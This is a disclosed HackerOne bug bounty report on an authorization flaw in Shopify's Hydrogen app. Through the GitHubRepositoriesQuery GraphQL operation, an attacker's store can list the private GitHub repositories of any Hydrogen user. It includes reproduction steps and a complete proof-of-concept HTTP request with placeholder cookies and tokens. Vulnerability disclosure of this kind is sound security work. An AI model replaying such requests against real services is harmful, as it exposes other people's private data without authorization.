# Attacker is able to query Github repositories of arbitrary Shopify Hydrogen Users 

## Report Details
- **Report ID**: 1692788
- **URL**: https://hackerone.com/reports/1692788
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-09-06T21:15:39.916Z
- **Disclosed**: 2023-03-09T18:45:57.372Z

## Reporter
- **Username**: kun_19
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
Shopify Hydrogen is a framework (based on React) that let you build personalized custom storefronts in a performant way. The Hydrogen app from the Shopify App Store supports to create a custom storefront with the Hydrogen framework (initial setup, deployment to Oxygen, etc.). Therefore, the user has to connect his GitHub account to the Hydrogen App.
An attacker is able to query the GitHub account / the private repositories of any Hydrogen user.

## Shops Used to Test:
https://19kun-27.myshopify.com (Victim) (Shopify Plus Store)
https://19kun-19.myshopify.com (Attacker) (Development Store)

## Steps To Reproduce:

  1.  (Victim) Create a Shopify Plus store and install the Hydrogen app from the Shopify App Store  (https://apps.shopify.com/hydrogen)
  2.  (Victim) Open the Hydrogen app and connect  a  Github account (make sure the Github account has several private repositories)
  3. (Victim) Click on "Create Storefront":  
{F1910344}
  4. (Victim) You should now see the connected GitHub account, including the private repositories:  
{F1910353}
  5. (Victim) In the background some HTTP requests are sent to the server, including to the vulnerable GraphQL operation **GitHubRepositoriesQuery**. Remember the `ownerName` and the `ownerId` of the victim for exploitation:  
████
  6. (Attacker) Log in to your store (e.g. a development store) and send following request with your attacker account to the server. Replace  the `<OWNER_NAME>` and `<OWNER_ID>` of the victim from the previous step and also replace the other placeholders `<ATTACKER_SHOPIFY_DOMAIN>`, `<COOKIES_ATTACKER>` and `<CSRF_TOKEN_ATTACKER>`:  
```
POST /admin/internal/web/graphql/core?operation=GitHubRepositoriesQuery&type=query HTTP/2
Host: <ATTACKER_SHOPIFY_DOMAIN>
Cookie: <COOKIES_ATTACKER>
Content-Length: 778
Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
X-Csrf-Token: <CSRF_TOKEN_ATTACKER>
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/json
Accept: application/json
X-Shopify-Web-Force-Proxy: 1
Sec-Ch-Ua-Platform: "macOS"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7

{
   "operationName":"GitHubRepositoriesQuery",
   "variables":{
      "ownerName":"<OWNER_NAME>",
      "ownerId":<OWNER_ID>,
      "searchQuery":"",
      "pageSize":15
   },
   "query":"query GitHubRepositoriesQuery($ownerName: String!, $ownerId: Int, $searchQuery: String, $pageSize: Int, $cursor: String) {\n  onlineStore {\n    versionControlGithub {\n      repositories(\n        ownerName: $ownerName\n        ownerId: $ownerId\n        first: $pageSize\n        searchQuery: $searchQuery\n        after: $cursor\n      ) {\n        totalCount\n        endCursor\n        hasNextPage\n        nodes {\n          id\n          name\n          description\n          writeAccess\n          defaultBranchName\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"
}
``` 
  7. (Attacker) The attacker should now be able to see the private repositories of the victim in the server's response (like in ████)

## Impact

An attacker is able to use the GitHub access token of arbitrary users to get private information about the connected GitHub account (e.g. private repositories)

## Attachments
- create_storefront.png
- connect_repository.png
